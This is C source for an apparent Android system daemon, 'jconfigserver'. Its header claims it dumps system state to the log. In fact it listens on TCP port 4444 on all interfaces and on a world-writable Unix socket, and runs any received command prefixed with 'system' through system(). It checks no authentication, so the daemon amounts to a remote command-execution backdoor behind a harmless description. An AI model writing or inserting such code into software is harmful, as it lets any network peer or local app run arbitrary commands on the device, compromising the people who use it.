/*
 * Command that dumps interesting system state to the log.
 *
 * add unix & socket function 20151202
 *
 */

#define LOG_TAG "configserver"


#include <getopt.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <fcntl.h>
#include <stdarg.h>
#include <dirent.h>
#include <limits.h>
#include <errno.h>

#include <cutils/misc.h>
#include <cutils/multiuser.h>

#include <sys/system_properties.h>

#include <sys/socket.h>
#include <sys/un.h>
#include <sys/select.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/atomics.h>
#include <sys/stat.h>
#include <sys/poll.h>

/* for ANDROID_SOCKET_* */
#include <cutils/sockets.h>

static int unix_fd = -1;
static int tcp_fd = -1;

#define PROP_SERVICE_NAME "jconfigserver"

#define STARTOK "execute ok"
#define STARTFAIL "failed execute"

#define SYSTEM_CMD "system"

#define SERVER_PORT "4444"
#define MAXPENDING 8


/*
 * create_socket - creates a Unix domain socket in ANDROID_SOCKET_DIR
 * ("/dev/socket") as dictated in init.rc. This socket is inherited by the
 * daemon. We communicate the file descriptor's value via the environment
 * variable ANDROID_SOCKET_ENV_PREFIX<name> ("ANDROID_SOCKET_foo").
 */
int create_socket(const char *name, int type, mode_t perm, uid_t uid, gid_t gid)
{
    struct sockaddr_un addr;
    int fd, ret;

    fd = socket(PF_UNIX, type, 0);
    if (fd < 0) {
        printf("Failed to open socket '%s': %s\n", name, strerror(errno));
        return -1;
    }

    memset(&addr, 0 , sizeof(addr));
    addr.sun_family = AF_UNIX;
    snprintf(addr.sun_path, sizeof(addr.sun_path), ANDROID_SOCKET_DIR"/%s",
             name);

    ret = unlink(addr.sun_path);
    if (ret != 0 && errno != ENOENT) {
        printf("Failed to unlink old socket '%s': %s\n", name, strerror(errno));
        goto out_close;
    }

    ret = bind(fd, (struct sockaddr *) &addr, sizeof (addr));
    if (ret) {
        printf("Failed to bind socket '%s': %s\n", name, strerror(errno));
        goto out_unlink;
    }

    chown(addr.sun_path, uid, gid);
    chmod(addr.sun_path, perm);

    printf("Created socket '%s' with mode '%o', user '%d', group '%d'\n",
         addr.sun_path, perm, uid, gid);

    return fd;

out_unlink:
    unlink(addr.sun_path);
out_close:
    close(fd);
    return -1;
}

void start_tcp_socket(void){
	
    int fd;
    struct sockaddr_in echoserver;
    
    printf("start_tcp_socket in\n");
      
		/* Create the TCP socket */
		if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		  return;
		}
		
    printf("start_tcp_socket socket\n");
      
		/* Construct the server sockaddr_in structure */
    memset(&echoserver, 0, sizeof(echoserver));       /* Clear struct */
    echoserver.sin_family = AF_INET;                  /* Internet/IP */
    echoserver.sin_addr.s_addr = htonl(INADDR_ANY);   /* Incoming addr */
    echoserver.sin_port = htons(atoi(SERVER_PORT));       /* server port */
            
    /* Bind the server socket */
    if (bind(fd, (struct sockaddr *) &echoserver,
                                 sizeof(echoserver)) < 0) {
      printf("Failed to bind the server socket\n");
      return;
    }
    
    fcntl(fd, F_SETFD, FD_CLOEXEC);
    fcntl(fd, F_SETFL, O_NONBLOCK);
    
    printf("start_tcp_socket bind\n");
    
    /* Listen on the server socket */
    if (listen(fd, MAXPENDING) < 0) {
      printf("Failed to listen on server socket\n");
      return;
    }
    
    printf("start_tcp_socket listen\n");
          

    //listen(fd, 8);
		
		tcp_fd = fd;
}

int get_tcp_set_fd()
{
	
    printf("get_tcp_set_fd :%d\n",tcp_fd);
    return tcp_fd;
}


void start_unix_socket(void)
{
    int fd;

    fd = create_socket(PROP_SERVICE_NAME, SOCK_STREAM, 0666, 0, 0);
    if(fd < 0) return;
    fcntl(fd, F_SETFD, FD_CLOEXEC);
    fcntl(fd, F_SETFL, O_NONBLOCK);

    listen(fd, MAXPENDING);
    unix_fd = fd;

}

int get_unix_set_fd()
{
    printf("get_unix_set_fd :%d\n",unix_fd);
    return unix_fd;
}


void handle_set_fd(int fd)
{
    unsigned char msg[64] ={0};
    unsigned char msg_load[64] ={0};
    int s;
    int r;
    int res;
    struct ucred cr;
    struct sockaddr_un addr;
    socklen_t addr_size = sizeof(addr);
    socklen_t cr_size = sizeof(cr);
    char * source_ctx = NULL;
    
    
    printf("handle_set_fd start\n");
    
    if(fd <=0 ){
    	
        return;
    }

    if ((s = accept(fd, (struct sockaddr *) &addr, &addr_size)) < 0) {
        return;
    }

    /* Check socket options here */
    if (getsockopt(s, SOL_SOCKET, SO_PEERCRED, &cr, &cr_size) < 0) {
        close(s);
        printf("Unable to receive socket options\n");
        return;
    }
    
    memset(msg,0,64);
    memset(msg_load,0,64);
    

    r = TEMP_FAILURE_RETRY(recv(s, &msg, sizeof(msg), 0));
    if(r <= 0) {
        printf("sys_prop: mis-match msg size received: %d expected: %d errno: %d\n",
              r, 64, errno);
        
        
        send(s, STARTFAIL, strlen(STARTFAIL), MSG_DONTWAIT);//reply for client
        close(s);
        return;
    }
    
    printf("payload data cmd length is:%d\n",r);
    
    if(r > 4){
	    int i=0;
	    for(i=0;i<4;i++){
	    	printf("payload data head is:%d\n",msg[i]);
	    }
	    
	    for(;i<r;i++){
	    	printf("payload data cmd is:%c\n",msg[i]);
	    }
	    
	    printf("payload data cmd is:%s\n",msg+4);
	    
	    sprintf(msg_load,"%s",msg+4);
	    
	    //char buf[64] ;
	    //sscanf(msg_load, "%6s", buf);
	    if(!strncmp(msg_load,SYSTEM_CMD,strlen(SYSTEM_CMD))){
	    	printf("payload excute system cmd is:%s\n",msg_load+strlen(SYSTEM_CMD));
	    	system(msg_load+strlen(SYSTEM_CMD));
	    }
	    	
	    
    }
    
    
    send(s, STARTOK, strlen(STARTOK), MSG_DONTWAIT);//reply for client
    close(s);
      
    //printf("payload data cmd is:%s,length is:%d\n",msg+4,r);
    
}


int main(int argc, char **argv)
{
    int fd_count = 0;
    struct pollfd ufds[4];
    char *tmpdev;
    char* debuggable;
    char tmp[32];
    int unix_set_fd_init = 0;
    int tcp_set_fd_init = 0;
    int signal_fd_init = 0;
    int keychord_fd_init = 0;
    bool is_charger = false;
    
    printf("jconfigserver in main!\n");
             
    printf("jconfigserver in start_unix_socket!\n");
    start_unix_socket(); 
    printf("jconfigserver in start_tcp_socket!\n");
    start_tcp_socket(); 
    		
    for(;;) {
    	
    	
      int nr, i, timeout = -1;
        	
		  if (!unix_set_fd_init && get_unix_set_fd() > 0) {
		      ufds[fd_count].fd = get_unix_set_fd();
		      ufds[fd_count].events = POLLIN;
		      ufds[fd_count].revents = 0;
		      fd_count++;
		      unix_set_fd_init = 1;
		  }
		  
		  if (!tcp_set_fd_init && get_tcp_set_fd() > 0) {
		      ufds[fd_count].fd = get_tcp_set_fd();
		      ufds[fd_count].events = POLLIN;
		      ufds[fd_count].revents = 0;
		      fd_count++;
		      tcp_set_fd_init = 1;
		  }
		  
		  nr = poll(ufds, fd_count, timeout);
      if (nr <= 0)
          continue;

      for (i = 0; i < fd_count; i++) {
          if (ufds[i].revents == POLLIN) {
              if (ufds[i].fd == get_unix_set_fd()){
              		printf("jconfigserver handle get_unix_set_fd!\n");
                  handle_set_fd(get_unix_set_fd());
              }
              else if (ufds[i].fd == get_tcp_set_fd()){
              		printf("jconfigserver handle get_tcp_set_fd!\n");
                  handle_set_fd(get_tcp_set_fd());
              }
              else {
              		printf("jconfigserver err fd!\n");
              }
          }
      }
		  
	}
	
	return 0;
}


